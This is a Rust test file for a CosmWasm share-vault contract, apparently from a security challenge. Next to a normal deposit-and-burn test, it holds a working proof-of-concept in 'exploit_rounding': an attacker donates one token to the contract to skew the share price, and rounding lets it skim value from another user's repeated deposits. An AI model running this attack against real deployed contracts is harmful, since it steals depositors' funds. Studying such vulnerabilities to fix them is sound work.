#[cfg(test)]
pub mod tests {
    use crate::{
        contract::DENOM,
        msg::{ExecuteMsg, InstantiateMsg, QueryMsg},
        state::{Balance, Config},
    };
    use cosmwasm_std::{coin, Addr, BankMsg, CosmosMsg, Empty, Uint128};
    use cw_multi_test::{App, Contract, ContractWrapper, Executor};

    pub fn challenge_contract() -> Box<dyn Contract<Empty>> {
        let contract = ContractWrapper::new(
            crate::contract::execute,
            crate::contract::instantiate,
            crate::contract::query,
        );
        Box::new(contract)
    }

    pub const USER: &str = "user";
    pub const USER2: &str = "user2";
    pub const ADMIN: &str = "admin";

    pub fn proper_instantiate() -> (App, Addr) {
        let mut app = App::default();
        let cw_template_id = app.store_code(challenge_contract());

        // init contract
        let msg = InstantiateMsg { offset: 10 };
        let contract_addr = app
            .instantiate_contract(
                cw_template_id,
                Addr::unchecked(ADMIN),
                &msg,
                &[],
                "test",
                None,
            )
            .unwrap();

        (app, contract_addr)
    }

    pub fn mint_tokens(mut app: App, recipient: String, amount: Uint128) -> App {
        app.sudo(cw_multi_test::SudoMsg::Bank(
            cw_multi_test::BankSudo::Mint {
                to_address: recipient,
                amount: vec![coin(amount.u128(), DENOM)],
            },
        ))
        .unwrap();
        app
    }

    #[test]
    fn basic_flow() {
        let (mut app, contract_addr) = proper_instantiate();

        // mint funds to user
        app = mint_tokens(app, USER.to_owned(), Uint128::new(10_000));

        // mint shares for user
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        // mint funds to user2
        app = mint_tokens(app, USER2.to_owned(), Uint128::new(10_000));

        // mint shares for user2
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        // query user
        let balance: Balance = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::UserBalance {
                    address: USER.to_string(),
                },
            )
            .unwrap();

        // burn shares for user
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Burn {
                shares: balance.amount,
            },
            &[],
        )
        .unwrap();

        // burn shares for user2
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Burn {
                shares: balance.amount,
            },
            &[],
        )
        .unwrap();

        let bal = app.wrap().query_balance(USER, DENOM).unwrap();
        assert_eq!(bal.amount, Uint128::new(10_000));

        let bal = app.wrap().query_balance(USER2, DENOM).unwrap();
        assert_eq!(bal.amount, Uint128::new(10_000));

        let bal = app
            .wrap()
            .query_balance(contract_addr.to_string(), DENOM)
            .unwrap();
        assert_eq!(bal.amount, Uint128::zero());
    }

    const HACKER: &str = "hacker";

    #[test]
    fn exploit_rounding() {
        // base scenario with 0 funds
        let (mut app, contract_addr) = proper_instantiate();
        // mint to USER
        app = mint_tokens(app, USER.to_owned(), Uint128::new(10_000));
        // mint to HACKER
        app = mint_tokens(app, HACKER.to_owned(), Uint128::new(1_001));

        // Hacker deposits 1_000
        app.execute_contract(
            Addr::unchecked(HACKER),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[coin(1_000, DENOM)],
        )
        .unwrap();
        // EXPLOIT: Hacker messes with the balance by bank sending 1 token
        app.execute(
            Addr::unchecked(HACKER),
            CosmosMsg::Bank(BankMsg::Send {
                to_address: contract_addr.to_string(),
                amount: vec![coin(1, DENOM)],
            }),
        )
        .unwrap();

        // Query CONFIG
        let config: Config = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::GetConfig {})
            .unwrap();
        assert_eq!(config.total_supply, Uint128::new(1_000));
        // Query contract balance
        let bal = app
            .wrap()
            .query_balance(contract_addr.to_string(), DENOM)
            .unwrap();
        assert_eq!(bal.amount, Uint128::new(1_001));
        // total_supply / total_assets < 1 and gets rounded by Uint128
        // in `multiply_ratio`

        // User DCAs over time
        for _ in 0..100 {
            app.execute_contract(
                Addr::unchecked(USER),
                contract_addr.clone(),
                &ExecuteMsg::Mint {},
                &[coin(100, DENOM)],
            )
            .unwrap();
        }

        // See hacker mint balance
        let balance: Balance = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::UserBalance {
                    address: HACKER.to_string(),
                },
            )
            .unwrap();
        assert_eq!(balance.amount, Uint128::new(1_000));

        // Hacker burns shares
        app.execute_contract(
            Addr::unchecked(HACKER),
            contract_addr.clone(),
            &ExecuteMsg::Burn {
                shares: balance.amount,
            },
            &[],
        )
        .unwrap();
        // Hacker deposited 1_000, bank sent 1,
        // but got 1_009 back
        let bal = app.wrap().query_balance(HACKER, DENOM).unwrap();
        assert_eq!(bal.amount, Uint128::new(1_009));

        // -
        // DEMO of rounding in Uint128
        let res = Uint128::new(10).multiply_ratio(Uint128::new(999), Uint128::new(1_000));
        assert_eq!(res, Uint128::new(9));
        let res = Uint128::new(10).multiply_ratio(Uint128::new(1_001), Uint128::new(999));
        assert_eq!(res, Uint128::new(10));
    }
}
